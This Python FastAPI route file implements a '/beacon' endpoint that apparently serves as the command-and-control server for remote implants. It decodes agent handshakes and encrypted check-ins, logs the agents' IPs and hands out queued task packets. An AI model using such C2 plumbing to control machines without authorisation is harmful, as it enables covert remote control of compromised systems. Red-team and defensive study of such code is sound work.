"""
POST /beacon — direct HTTP beacon endpoint.
"""
from __future__ import annotations
from typing import Optional
from fastapi import APIRouter, Depends, Request
from pydantic import BaseModel
from sqlalchemy.orm import Session

from services.agent_manager import manager as agent_manager
from services.ws_manager import ws_manager
from models.log import Log
from database import get_db

import logging as _logging
_blog = _logging.getLogger("beacon")

router = APIRouter(tags=["beacon"])


class BeaconRequest(BaseModel):
    id: str
    p:  str


class BeaconResponse(BaseModel):
    p: Optional[str] = None


@router.post("/beacon", response_model=BeaconResponse)
async def post_beacon(request: Request, body: BeaconRequest, db: Session = Depends(get_db)):
    agent_id = body.id
    b64_pkt  = body.p

    import base64, json
    try:
        raw      = base64.b64decode(b64_pkt)
        decoded  = json.loads(raw.decode())
        pkt_type = decoded.get("t", "")
    except Exception as _e:
        pkt_type = "encrypted"
        _blog.debug("pkt decode: agent=%s type=encrypted (%s)", agent_id, _e)

    _blog.info("beacon: agent=%s pkt_type=%s", agent_id, pkt_type)

    if pkt_type == "h":
        result = agent_manager.process_handshake(b64_pkt, db)
        for event in result.get("events", []):
            await ws_manager.broadcast(event)
        return BeaconResponse(p=result.get("response"))

    client_ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "")
    )
    result = agent_manager.process_beacon(agent_id, b64_pkt, db, client_ip=client_ip)
    for event in result.get("events", []):
        await ws_manager.broadcast(event)

    # Only dispatch tasks when the beacon was successfully decrypted.
    # process_beacon always appends "agent_seen" on success; empty events
    # means the decrypt failed — don't mark tasks "sent" in that case.
    beacon_ok = any(e.get("type") == "agent_seen" for e in result.get("events", []))
    if not beacon_ok:
        return BeaconResponse(p=None)

    db.add(Log(agent_id=agent_id, event="beacon_checkin", detail="ok"))
    db.commit()

    task_pkt = agent_manager.get_pending_task_packet(agent_id, db)
    if task_pkt:
        return BeaconResponse(p=task_pkt)

    session = agent_manager.get_session(agent_id)
    if session and session.crypto.ready:
        return BeaconResponse(p=session.crypto.seal_json({"t": "n"}))

    return BeaconResponse(p=None)
